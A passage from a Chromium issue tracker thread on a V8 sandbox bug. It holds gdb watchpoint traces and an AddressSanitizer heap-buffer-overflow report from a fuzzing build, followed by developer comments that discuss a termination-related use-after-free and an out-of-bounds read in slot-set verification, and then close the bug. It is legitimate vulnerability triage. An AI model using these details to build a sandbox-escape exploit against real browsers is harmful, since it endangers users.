v8::internal::PrimitiveArrayBase<v8::internal::FixedDoubleArray, v8::internal::FixedDoubleArrayShape, v8::internal::HeapObjectLayout>::Allocate<v8::internal::Isolate> (isolate=0x7f0ff71e1000, length=9, no_gc_out=<optimized out>, allocation=<optimized out>) at ../../v8/src/objects/fixed-array-inl.h:546
546     ../../v8/src/objects/fixed-array-inl.h: No such file or directory.
+info args
isolate = 0x7f0ff71e1000
length = 9
no_gc_out = <optimized out>
allocation = <optimized out>
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 18
0x00007ffff7e1572a in ?? () from /lib/x86_64-linux-gnu/libc.so.6
+info args
No symbol table info available.
+continue
7aef00197c28

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Old value = 18
New value = 188
0x000055555faadecb in Builtins_DataViewPrototypeSetUint32 ()
+info args
No symbol table info available.
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Old value = 188
New value = 44988
0x000055555faaded0 in Builtins_DataViewPrototypeSetUint32 ()
+info args
No symbol table info available.
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Old value = 44988
New value = 3452860
0x000055555faaded5 in Builtins_DataViewPrototypeSetUint32 ()
+info args
No symbol table info available.
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
0x000055555faadeda in Builtins_DataViewPrototypeSetUint32 ()
+info args
No symbol table info available.
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:55
55      ../../v8/src/objects/tagged-field-inl.h: No such file or directory.
+info args
this = 0x7aef00197c28
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:55
55      in ../../v8/src/objects/tagged-field-inl.h
+info args
this = 0x7aef00197c28
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:55
55      ../../v8/src/objects/tagged-field-inl.h: No such file or directory.
+info args
this = 0x7aef00197c28
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:55
55      in ../../v8/src/objects/tagged-field-inl.h
+info args
this = 0x7aef00197c28
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:55
55      ../../v8/src/objects/tagged-field-inl.h: No such file or directory.
+info args
this = 0x7aef00197c28
+continue

Hardware access (read/write) watchpoint 1: *(uint32_t*) 0x7aef00197c28

Value = 3452860
v8::internal::TaggedMember<v8::internal::Smi, v8::internal::V8HeapCompressionSchemeImpl<v8::internal::MainCage> >::Acquire_Load (this=0x7aef00197c28) at ../../v8/src/objects/tagged-field-inl.h:83
83      in ../../v8/src/objects/tagged-field-inl.h
+info args
this = 0x7aef00197c28
+continue
=================================================================
==43629==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x7d5ff71e0e88 at pc 0x55555928a322 bp 0x7fffffffc430 sp 0x7fffffffc428
READ of size 8 at 0x7d5ff71e0e88 thread T0
SCARINESS: 23 (8-byte-read-heap-buffer-overflow)
[Detaching after fork from child process 43652]
    #0 0x55555928a321 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/support/c11.h:75:10
    #1 0x55555928a321 in std::__Cr::__atomic_base<long, false>::load(std::__Cr::memory_order) const volatile third_party/libc++/src/include/__atomic/atomic.h:66:12
    #2 0x55555928a321 in long std::__Cr::atomic_load_explicit<long>(std::__Cr::atomic<long> const volatile*, std::__Cr::memory_order) third_party/libc++/src/include/__atomic/atomic.h:533:15
    #3 0x55555928a321 in v8::base::Acquire_Load(long const volatile*) v8/src/base/atomicops.h:352:10
    #4 0x55555928a321 in heap::base::BasicSlotSet<4ul>::Bucket* v8::base::AsAtomicImpl<long>::Acquire_Load<heap::base::BasicSlotSet<4ul>::Bucket*>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/base/atomic-utils.h:81:9
    #5 0x55555928a321 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(heap::base::BasicSlotSet<4ul>::Bucket**) v8/src/heap/base/basic-slot-set.h:415:14
    #6 0x55555928a321 in heap::base::BasicSlotSet<4ul>::Bucket* heap::base::BasicSlotSet<4ul>::LoadBucket<(heap::base::BasicSlotSet<4ul>::AccessMode)0>(unsigned long) v8/src/heap/base/basic-slot-set.h:421:12
    #7 0x55555928a321 in unsigned long heap::base::BasicSlotSet<4ul>::Iterate<(heap::base::BasicSlotSet<4ul>::AccessMode)0, unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda'(unsigned long), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode)::'lambda0'(unsigned long)) v8/src/heap/base/basic-slot-set.h:347:24
    #8 0x555559289dfb in unsigned long v8::internal::SlotSet::Iterate<(v8::internal::AccessMode)0, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot)>(unsigned long, unsigned long, unsigned long, v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long)::'lambda'(v8::internal::CompressedMaybeObjectSlot), heap::base::BasicSlotSet<4ul>::EmptyBucketMode) v8/src/heap/slot-set.h:154:26
    #9 0x555559289dfb in v8::internal::RememberedSetOperations::CheckNoneInRange(v8::internal::SlotSet*, v8::internal::MemoryChunk*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:80:17
    #10 0x55555920c834 in v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::CheckNoneInRange(v8::internal::MutablePageMetadata*, unsigned long, unsigned long) v8/src/heap/remembered-set.h:155:5
    #11 0x55555920c834 in v8::internal::Heap::VerifySlotRangeHasNoRecordedSlots(unsigned long, unsigned long) v8/src/heap/heap.cc:6728:3
    #12 0x5555591b6694 in v8::internal::Heap::NotifyObjectSizeChange(v8::internal::Tagged<v8::internal::HeapObject>, int, int, v8::internal::ClearRecordedSlots) v8/src/heap/heap.cc:4276:3
    #13 0x5555591b730e in void v8::internal::Heap::RightTrimArray<v8::internal::FixedDoubleArray>(v8::internal::Tagged<v8::internal::FixedDoubleArray>, int, int) v8/src/heap/heap.cc:3656:5
    #14 0x555559cbf0bc in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLengthImpl(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int, v8::internal::DirectHandle<v8::internal::FixedArrayBase>) v8/src/objects/elements.cc:867:7
    #15 0x555559cbf0bc in v8::internal::(anonymous namespace)::ElementsAccessorBase<v8::internal::(anonymous namespace)::FastPackedDoubleElementsAccessor, v8::internal::(anonymous namespace)::ElementsKindTraits<(v8::internal::ElementsKind)4>>::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/elements.cc:815:12
    #16 0x55555a3574b2 in v8::internal::JSArray::SetLength(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSArray>, unsigned int) v8/src/objects/objects.cc:4317:40
    #17 0x555558623067 in v8::internal::Accessors::ArrayLengthSetter(v8::Local<v8::Name>, v8::Local<v8::Value>, v8::PropertyCallbackInfo<v8::Boolean> const&) v8/src/builtins/accessors.cc:209:7
    #18 0x55555a0a8202 in v8::internal::PropertyCallbackArguments::CallAccessorSetter(v8::internal::DirectHandle<v8::internal::AccessorInfo>, v8::internal::DirectHandle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/api/api-arguments-inl.h:460:3
    #19 0x55555a33d91f in v8::internal::Object::SetPropertyWithAccessor(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:1596:24
    #20 0x55555a34897d in v8::internal::Object::SetPropertyInternal(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::Maybe<v8::internal::ShouldThrow>, v8::internal::StoreOrigin, bool*) v8/src/objects/objects.cc:2359:16
    #21 0x55555a347eac in v8::internal::Object::SetProperty(v8::internal::LookupIterator*, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin, v8::Maybe<v8::internal::ShouldThrow>) v8/src/objects/objects.cc:2453:9
    #22 0x55555a05ce8e in v8::internal::StoreIC::Store(v8::internal::Handle<v8::internal::Union<v8::internal::Smi, v8::internal::HeapNumber, v8::internal::BigInt, v8::internal::String, v8::internal::Symbol, v8::internal::Boolean, v8::internal::Null, v8::internal::Undefined, v8::internal::JSReceiver>>, v8::internal::Handle<v8::internal::Name>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::StoreOrigin) v8/src/ic/ic.cc:1972:5
    #23 0x55555a077d66 in v8::internal::__RT_impl_Runtime_StoreIC_Miss(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/ic/ic.cc:2974:3
    #24 0x55555a077038 in v8::internal::Runtime_StoreIC_Miss(int, unsigned long*, v8::internal::Isolate*) v8/src/ic/ic.cc:2946:1
    #25 0x55555fa0367c in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #26 0x55555fbdd913 in Builtins_SetNamedPropertyHandler setup-isolate-deserialize.cc
    #27 0x55555f8c4ba2 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #28 0x55555f8bfd26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #29 0x55555f8bfa6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #30 0x555558d78456 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #31 0x555558d78456 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #32 0x555558d7c529 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #33 0x55555850704f in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #34 0x555557c5de9c in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #35 0x555557ca4166 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #36 0x555557cb285c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6307:37
    #37 0x555557cb159e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6215:18
    #38 0x555557cb63d8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7100:18
    #39 0x7ffff7ccf249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

0x7d5ff71e0e88 is located 0 bytes after 520-byte region [0x7d5ff71e0c80,0x7d5ff71e0e88)
allocated by thread T0 here:
    #0 0x555557bd9147 in posix_memalign (/home/david/chrome/d/src/out/fuzzbuild-with-symbols/d8+0x2685147) (BuildId: 4f6e666d50eecf57)
    #1 0x555559615f06 in v8::base::AlignedAlloc(unsigned long, unsigned long) v8/src/base/platform/memory.h:97:7
    #2 0x555559615f06 in heap::base::BasicSlotSet<4ul>::Allocate(unsigned long) v8/src/heap/base/basic-slot-set.h:64:24
    #3 0x555559615f06 in v8::internal::SlotSet::Allocate(unsigned long) v8/src/heap/slot-set.h:134:34
    #4 0x555559615f06 in v8::internal::MutablePageMetadata::AllocateSlotSet(v8::internal::RememberedSetType) v8/src/heap/mutable-page-metadata.cc:232:27
    #5 0x5555591a733b in void v8::internal::RememberedSet<(v8::internal::RememberedSetType)0>::Insert<(v8::internal::AccessMode)1>(v8::internal::MutablePageMetadata*, unsigned long) v8/src/heap/remembered-set.h:100:24
    #6 0x5555591a733b in v8::internal::WriteBarrier::GenerationalBarrierSlow(v8::internal::Tagged<v8::internal::HeapObject>, unsigned long, v8::internal::Tagged<v8::internal::HeapObject>) v8/src/heap/heap-write-barrier.cc:377:5
    #7 0x555557ce9884 in v8::internal::WriteBarrier::CombinedWriteBarrierInternal(v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::CompressedHeapObjectSlot, v8::internal::Tagged<v8::internal::HeapObject>, v8::internal::WriteBarrierMode) v8/src/heap/heap-write-barrier-inl.h:51:7
    #8 0x5555590487b8 in v8::internal::Factory::NewJSArrayWithUnverifiedElements(v8::internal::DirectHandle<v8::internal::Map>, v8::internal::DirectHandle<v8::internal::FixedArrayBase>, int, v8::internal::AllocationType) v8/src/heap/factory.cc:3295:8
    #9 0x555559048528 in v8::internal::Factory::NewJSArrayWithUnverifiedElements(v8::internal::DirectHandle<v8::internal::FixedArrayBase>, v8::internal::ElementsKind, int, v8::internal::AllocationType) v8/src/heap/factory.cc:3285:10
    #10 0x55555aa9af26 in v8::internal::MaybeDirectHandle<v8::internal::JSObject> v8::internal::(anonymous namespace)::CreateLiteral<v8::internal::(anonymous namespace)::ArrayLiteralHelper>(v8::internal::Isolate*, v8::internal::Handle<v8::internal::HeapObject>, int, v8::internal::Handle<v8::internal::HeapObject>, int) v8/src/runtime/runtime-literals.cc:543:21
    #11 0x55555aa9af26 in v8::internal::__RT_impl_Runtime_CreateArrayLiteral(v8::internal::Arguments<(v8::internal::ArgumentsType)0>, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:590:3
    #12 0x55555aa99f58 in v8::internal::Runtime_CreateArrayLiteral(int, unsigned long*, v8::internal::Isolate*) v8/src/runtime/runtime-literals.cc:582:1
    #13 0x55555fa0367c in Builtins_CEntry_Return1_ArgvOnStack_NoBuiltinExit setup-isolate-deserialize.cc
    #14 0x55555fbfdfa5 in Builtins_CreateArrayLiteralHandler setup-isolate-deserialize.cc
    #15 0x55555f8c4ba2 in Builtins_InterpreterEntryTrampoline setup-isolate-deserialize.cc
    #16 0x55555f8bfd26 in Builtins_JSEntryTrampoline setup-isolate-deserialize.cc
    #17 0x55555f8bfa6a in Builtins_JSEntry setup-isolate-deserialize.cc
    #18 0x555558d78456 in v8::internal::GeneratedCode<unsigned long, unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**>::Call(unsigned long, unsigned long, unsigned long, unsigned long, long, unsigned long**) v8/src/execution/simulator.h:212:12
    #19 0x555558d78456 in v8::internal::(anonymous namespace)::Invoke(v8::internal::Isolate*, v8::internal::(anonymous namespace)::InvokeParams const&) v8/src/execution/execution.cc:442:22
    #20 0x555558d7c529 in v8::internal::Execution::CallScript(v8::internal::Isolate*, v8::internal::DirectHandle<v8::internal::JSFunction>, v8::internal::DirectHandle<v8::internal::Object>, v8::internal::DirectHandle<v8::internal::Object>) v8/src/execution/execution.cc:542:10
    #21 0x55555850704f in v8::Script::Run(v8::Local<v8::Context>, v8::Local<v8::Data>) v8/src/api/api.cc:1937:7
    #22 0x555557c5de9c in v8::Shell::ExecuteString(v8::Isolate*, v8::Local<v8::String>, v8::Local<v8::String>, v8::Shell::ReportExceptions, v8::Global<v8::Value>*) v8/src/d8/d8.cc:1033:44
    #23 0x555557ca4166 in v8::SourceGroup::Execute(v8::Isolate*) v8/src/d8/d8.cc:5351:10
    #24 0x555557cb285c in v8::Shell::RunMainIsolate(v8::Isolate*, bool) v8/src/d8/d8.cc:6307:37
    #25 0x555557cb159e in v8::Shell::RunMain(v8::Isolate*, bool) v8/src/d8/d8.cc:6215:18
    #26 0x555557cb63d8 in v8::Shell::Main(int, char**) v8/src/d8/d8.cc:7100:18
    #27 0x7ffff7ccf249  (/lib/x86_64-linux-gnu/libc.so.6+0x27249) (BuildId: 79005c16293efa45b441fed45f4f29b138557e9e)

SUMMARY: AddressSanitizer: heap-buffer-overflow third_party/libc++/src/include/__atomic/support/c11.h:75:10 in long std::__Cr::__cxx_atomic_load<long>(std::__Cr::__cxx_atomic_base_impl<long> const volatile*, std::__Cr::memory_order)
Shadow bytes around the buggy address:
  0x7d5ff71e0c00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e0c80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e0d00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e0d80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
  0x7d5ff71e0e00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x7d5ff71e0e80: 00[fa]fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e0f00: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e0f80: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1000: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1080: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
  0x7d5ff71e1100: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
Shadow byte legend (one shadow byte represents 8 application bytes):
  Addressable:           00
  Partially addressable: 01 02 03 04 05 06 07 
  Heap left redzone:       fa
  Freed heap region:       fd
  Stack left redzone:      f1
  Stack mid redzone:       f2
  Stack right redzone:     f3
  Stack after return:      f5
  Stack use after scope:   f8
  Global redzone:          f9
  Global init order:       f6
  Poisoned by user:        f7
  Container overflow:      fc
  Array cookie:            ac
  Intra object redzone:    bb
  ASan internal:           fe
  Left alloca redzone:     ca
  Right alloca redzone:    cb
==43629==ABORTING

## V8 sandbox violation detected!


```

The fix should be included in this version as the UAF fails with the aforementioned check:

```
# Safely terminating process due to error in ../../v8/src/init/isolate-group.h, line 172
# The following harmless error was encountered: Check failed: isolate_ == isolate (0 vs. 0x78a599ae1000).

```

### am...@chromium.org (2025-07-25)

Hi bikineev@ -- it looks like this issue may still be reproducible. Can you PTAL?

### ml...@chromium.org (2025-07-25)

I think this looks now like the OOB I was assuming is also there. Basically, there were two issues:

1. UAF due to termination
2. unvalidated use of end address

### bi...@chromium.org (2025-08-06)

I believe the other issue is harmless in the sense that it only affects the debug code (VerifyNoNeedToClearSlots). IIUC, what happens in the PoC is that the size of an array gets modified via the sandbox testing API, then the array gets right-trimmed and we call VerifyNoNeedToClearSlots for that invalid area. Perhaps the sanity checks on the remembered-set side would still be beneficial.

### bi...@chromium.org (2025-08-07)

There is another path that clears the slots. However, we do have an OOB-check there: https://source.chromium.org/chromium/chromium/src/+/main:v8/src/heap/base/basic-slot-set.h;l=458. A theoretical problem that may occur is that the attacker may "right trim" the area of an existing object containing pointers and thereby cause the slots to be cleared. However, this should still be safe and not escape the sandbox, since this may only cause a preliminary collection of sandboxed objects.

So I'm inclined to close the bug. Please reopen if you think this is still a security issue.

### da...@hirsch.cx (2025-08-12)

Thanks for having another look!

If I run the fuzzer on a debug build, this crash occurs quite often.
Therefore, fixing this would be beneficial for fuzzer cleanliness but I also understand that this is not really a supported configuration at the time being.

### ch...@google.com (2025-11-14)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/430498032)*
